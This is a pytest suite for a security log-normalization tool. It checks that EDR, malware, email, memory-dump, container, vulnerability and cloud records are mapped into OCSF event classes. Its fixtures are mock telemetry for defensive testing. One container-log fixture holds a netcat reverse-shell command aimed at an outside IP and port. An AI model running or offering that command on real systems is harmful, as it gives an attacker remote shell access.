"""
Specula Test Suite for Phase 2 & Phase 3 OCSF Normalizers.

Covers verification criteria specified in ocsf_phase2_phase3_implementation_plan_FINAL.md §7 & §8:
  - Sub-event branching (EDR, Memory Dumps, Containers)
  - UID determinism (insertion-order independence)
  - Mandatory fields & OCSFBaseEvent inheritance
  - Dual timestamps (time vs raw_source_timestamp)
  - clock_skew_unverified flags for non-DC anchored sources
  - FastMCP gateway port routing (8106-8113)
  - Threat Intel boundary isolation check
"""

import pytest
from src.schemas.ocsf_phase2_events import (
    AuthenticationEvent,
    DetectionFindingEvent,
    EmailActivityEvent,
    FileActivityEvent,
    IncidentFindingEvent,
    NetworkActivityEvent,
    ProcessActivityEvent,
)
from src.schemas.ocsf_phase3_events import (
    DeviceInventoryInfoEvent,
    HTTPActivityEvent,
    VulnerabilityFindingEvent,
)
from src.ingestion.normalization import (
    cloud_topology_normalizer,
    container_normalizer,
    edr_normalizer,
    email_normalizer,
    malware_normalizer,
    memory_dump_normalizer,
    ueba_browser_normalizer,
    vuln_scan_normalizer,
)
from src.mcp.fastmcp_gateway import normalize_log_batch
from src.schemas.entity_resolver import CanonicalEntityResolver

dummy_resolver = CanonicalEntityResolver()


def test_edr_normalizer_subevent_branching():
    raw_proc = {
        "event_type": "process_create",
        "timestamp": "2026-08-08T12:00:00Z",
        "process_name": "powershell.exe",
        "process_pid": 1234,
        "command_line": "powershell.exe -enc test",
        "host_name": "HOST-01",
        "alert_title": "Suspicious PowerShell Execution",
    }
    events = edr_normalizer.normalize(raw_proc, trace_id="trace-123", case_id="CASE-1", entity_resolver=dummy_resolver)
    assert len(events) == 2
    assert isinstance(events[0], ProcessActivityEvent)
    assert isinstance(events[1], DetectionFindingEvent)
    assert events[0].class_uid == 1007
    assert events[1].class_uid == 2004
    assert events[0].case_id == "CASE-1"
    assert events[0].raw_source_timestamp == "2026-08-08T12:00:00Z"


def test_edr_uid_determinism():
    payload_a = {"event_type": "file_write", "file_name": "malware.exe", "host_name": "H1", "timestamp": "2026-08-08T12:00:00Z"}
    payload_b = {"timestamp": "2026-08-08T12:00:00Z", "host_name": "H1", "file_name": "malware.exe", "event_type": "file_write"}
    
    events_a = edr_normalizer.normalize(payload_a, trace_id="t1", case_id="C1", entity_resolver=dummy_resolver)
    events_b = edr_normalizer.normalize(payload_b, trace_id="t1", case_id="C1", entity_resolver=dummy_resolver)
    
    assert events_a[0].uid == events_b[0].uid


def test_malware_normalizer_behavior_chain_and_verdict():
    # IncidentFindingEvent for behavioral chain
    chain_payload = {
        "timestamp": "2026-08-08T12:00:00Z",
        "sample_name": "sample.exe",
        "verdict": "Malicious",
        "behavior_chain": [{"action": "drop_file", "path": "C:\\temp\\bad.dll"}],
    }
    events_chain = malware_normalizer.normalize(chain_payload, trace_id="t1", case_id="C1")
    assert len(events_chain) == 1
    assert isinstance(events_chain[0], IncidentFindingEvent)
    assert events_chain[0].class_uid == 2005
    assert events_chain[0].clock_skew_unverified is True
    assert events_chain[0].clock_skew_offset_ms == 0

    # DetectionFindingEvent for static-only match
    static_payload = {
        "timestamp": "2026-08-08T12:00:00Z",
        "sample_name": "sample.exe",
        "yara_rule": "Ransomware_Key",
        "verdict": "Malicious",
    }
    events_static = malware_normalizer.normalize(static_payload, trace_id="t1", case_id="C1")
    assert len(events_static) == 1
    assert isinstance(events_static[0], DetectionFindingEvent)
    assert events_static[0].class_uid == 2004


def test_email_normalizer_and_verdict_finding():
    email_payload = {
        "timestamp": "2026-08-08T12:00:00Z",
        "sender": "attacker@phish.com",
        "recipient": "victim@corp.com",
        "subject": "Urgent Invoice Required",
        "verdict": "Phishing",
        "is_cloud_gateway": True,
    }
    events = email_normalizer.normalize(email_payload, trace_id="t1", case_id="C1")
    assert len(events) == 2
    assert isinstance(events[0], EmailActivityEvent)
    assert events[0].class_uid == 4009
    assert events[0].category_uid == 4
    assert events[0].clock_skew_unverified is True
    assert isinstance(events[1], DetectionFindingEvent)
    assert events[1].class_uid == 2004


def test_memory_dump_normalizer():
    ps_payload = {"plugin": "pslist", "ImageFileName": "lsass.exe", "PID": 500, "timestamp": "2026-08-08T12:00:00Z"}
    net_payload = {"plugin": "netscan", "LocalAddr": "192.168.1.5", "ForeignAddr": "10.0.0.1", "LocalPort": 445, "timestamp": "2026-08-08T12:00:00Z"}
    mal_payload = {"plugin": "malfind", "process_name": "svchost.exe", "process_pid": 1000, "timestamp": "2026-08-08T12:00:00Z"}

    ps_ev = memory_dump_normalizer.normalize(ps_payload, trace_id="t1", case_id="C1")[0]
    net_ev = memory_dump_normalizer.normalize(net_payload, trace_id="t1", case_id="C1")[0]
    mal_ev = memory_dump_normalizer.normalize(mal_payload, trace_id="t1", case_id="C1")[0]

    assert isinstance(ps_ev, ProcessActivityEvent)
    assert ps_ev.class_uid == 1007
    assert isinstance(net_ev, NetworkActivityEvent)
    assert net_ev.class_uid == 4001
    assert isinstance(mal_ev, DetectionFindingEvent)
    assert mal_ev.class_uid == 2004


def test_container_normalizer_context_enrichment():
    container_payload = {
        "timestamp": "2026-08-08T12:00:00Z",
        "log_type": "process",
        "cmd": "nc -e /bin/sh 1.2.3.4 4444",
        "container_id": "c12345",
        "image_name": "alpine:latest",
        "pod_name": "p-shell-pod",
        "is_managed_k8s": True,
    }
    events = container_normalizer.normalize(container_payload, trace_id="t1", case_id="C1")
    assert len(events) == 1
    ev = events[0]
    assert isinstance(ev, ProcessActivityEvent)
    assert ev.container is not None
    assert ev.container["container_id"] == "c12345"
    assert ev.container["image_name"] == "alpine:latest"
    assert ev.clock_skew_unverified is True


def test_vuln_scan_normalizer_severity_mapping():
    scan_payload = {
        "timestamp": "2026-08-08T12:00:00Z",
        "cve": "CVE-2021-44228",
        "title": "Log4Shell",
        "severity": "Critical",
        "cvss_score": 10.0,
        "host_name": "APP-SERVER-01",
    }
    events = vuln_scan_normalizer.normalize(scan_payload, trace_id="t1", case_id="C1")
    assert len(events) == 1
    ev = events[0]
    assert isinstance(ev, VulnerabilityFindingEvent)
    assert ev.class_uid == 2002
    assert ev.severity_id == 5
    assert ev.vulnerability_id == "CVE-2021-44228"
    assert ev.clock_skew_unverified is True


def test_ueba_browser_normalizer():
    browser_payload = {
        "timestamp": "2026-08-08T12:00:00Z",
        "artifact_type": "browser_history",
        "url": "https://malicious.site/login",
        "user_agent": "Mozilla/5.0",
    }
    ueba_payload = {
        "timestamp": "2026-08-08T12:00:00Z",
        "artifact_type": "ueba_anomaly",
        "anomaly_name": "Impossible Travel",
        "confidence": "High",
    }

    browser_ev = ueba_browser_normalizer.normalize(browser_payload, trace_id="t1", case_id="C1")[0]
    ueba_ev = ueba_browser_normalizer.normalize(ueba_payload, trace_id="t1", case_id="C1")[0]

    assert isinstance(browser_ev, HTTPActivityEvent)
    assert browser_ev.class_uid == 4002
    assert isinstance(ueba_ev, DetectionFindingEvent)
    assert ueba_ev.class_uid == 2004


def test_cloud_topology_normalizer():
    topo_payload = {
        "timestamp": "2026-08-08T12:00:00Z",
        "resource_id": "arn:aws:ec2:us-east-1:123456789012:instance/i-0123456789abcdef0",
        "resource_name": "Prod-DB",
        "resource_type": "AWS::EC2::Instance",
        "region": "us-east-1",
    }
    events = cloud_topology_normalizer.normalize(topo_payload, trace_id="t1", case_id="C1")
    assert len(events) == 1
    ev = events[0]
    assert isinstance(ev, DeviceInventoryInfoEvent)
    assert ev.class_uid == 5001
    assert ev.category_uid == 5
    assert ev.clock_skew_unverified is True
    assert ev.clock_skew_offset_ms == 0


def test_fastmcp_gateway_port_routing():
    # Test ports 8106 to 8113
    payload = {"timestamp": "2026-08-08T12:00:00Z", "event_type": "process_create", "process_name": "test.exe"}
    
    for port in range(8106, 8114):
        res = normalize_log_batch(port=port, raw_payload=payload, trace_id="t1", case_id="C1")
        assert isinstance(res, list)
        assert len(res) >= 1
        assert "class_uid" in res[0]
        assert "case_id" in res[0]
        assert res[0]["case_id"] == "C1"


def test_threat_intel_boundary_isolation():
    # Ensure no threat intel port exists in gateway
    with pytest.raises(ValueError, match="No gateway normalizer registered for port 8114"):
        normalize_log_batch(port=8114, raw_payload={}, trace_id="t1")
